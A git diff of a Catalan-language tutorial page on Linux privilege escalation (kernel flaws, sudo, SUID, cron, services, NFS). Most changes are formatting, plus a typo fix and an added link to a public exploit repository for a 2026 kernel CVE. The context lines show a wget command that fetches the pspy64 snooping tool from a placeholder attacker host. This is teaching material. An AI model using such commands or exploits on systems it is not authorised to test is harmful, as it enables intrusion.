@@ -424,8 +424,10 @@ wget http://LA_TEVA_IP:8080/pspy64     </pre>
       <li>i més....</li>
     </ul>
     <p>No s'ha de perdre de vista este tipus de vulnerabilitats de kernel, perquè molts sistemes no estan actualitzats i poden tindre forats de seguretat oberts</p>
+    <p>CVE-2026-31431 (“Copy Fail”) - Abril 2026 !! <br>
+    ==> més informació en https://github.com/painoob/Copy-Fail-Exploit-CVE-2026-31431/tree/main </p>
 
-    <h2>Escalada amb sudo</h2>
+    <hr><h2>Escalada amb sudo</h2>
     <h3>Que és sudo</h3>
     <p><strong>sudo</strong> (superuser do) és una eina que permet a usuaris normals executar comandes amb privilegis elevats (normalment com a root),
        de manera controlada i auditada.</p>
@@ -462,7 +464,7 @@ wget http://LA_TEVA_IP:8080/pspy64     </pre>
       </pre>
 
     
-    <h2>Escalada amb SUID/SGID</h2>
+    <hr><h2>Escalada amb SUID/SGID</h2>
     <p>El bit SUID <strong>Set-User-ID</strong> és un mecanisme de permisos de Linux/Unix que permet 
       que un programa s’execute amb els privilegis del propietari del fitxer, i no amb els de l’usuari que l’executa. </p>
       <h4>Com identificar-lo</h4>
@@ -524,11 +526,11 @@ drwxrwxrwt 11 root root 4096 mar  6 15:25 /var/tmp
     </pre>     
 
      <h3>Escalada</h3>
-     <p>Conieixent este mecanisme es podrà fer una escalada de privilegis local a través d'estos binaris, de forma
+     <p>Coneixent este mecanisme es podrà fer una escalada de privilegis local a través d'estos binaris, de forma
       similar a la explicada en sudo.       </p>
       <p class="alert">La web GTFOBins també té informació sobre com utilitzar els binaris mal configurats. </p>
 
-    <h2>Escalada amb tasques programades</h2>
+    <hr><h2>Escalada amb tasques programades</h2>
     <p>Les tasques programades amb cron permeten executar comandes o scripts automàticament a Linux/Unix segons un 
       horari definit. És una eina fonamental d’administració de sistemes, però també rellevant en seguretat i auditoria.</p>
       <h3>⏰ Què és cron?</h3>
@@ -556,7 +558,7 @@ drwxrwxrwt 11 root root 4096 mar  6 15:25 /var/tmp
           <li>Ús de comodins o "wildcards"</li>
         </ul>
 
-    <h2>Escalada amb serveis</h2>
+    <hr><h2>Escalada amb serveis</h2>
     <p>Si s'identifica un servei (com per exemple MySql) executant-se com a <code>root</code>, es podrien crear 
     comandes des de dins de MySql, llançar-les, i estes seran executades amb permisos de root</p>
 
@@ -564,7 +566,7 @@ drwxrwxrwt 11 root root 4096 mar  6 15:25 /var/tmp
       i en la secció corresponent a  <a href="https://book.hacktricks.wiki/es/linux-hardening/privilege-escalation/index.html#services">serveis</a> 
  és bàsicament un manual estructurat tipus “cheat-sheet + explicació” amb tècniques, exemples i notes pràctiques.</p>
 
-    <h2>Escalada amb NFS (Network File System)</h2>
+    <hr><h2>Escalada amb NFS (Network File System)</h2>
     <p>NFS permet compartir directoris entre sistemes Unix/Linux a través de la xarxa, de manera que un client pot muntar 
       un directori remot com si fos local. És molt útil, però perillós si està mal configurat.</p>
       <h3>⚠️ Per què NFS pot provocar escalada de privilegis?</h3>
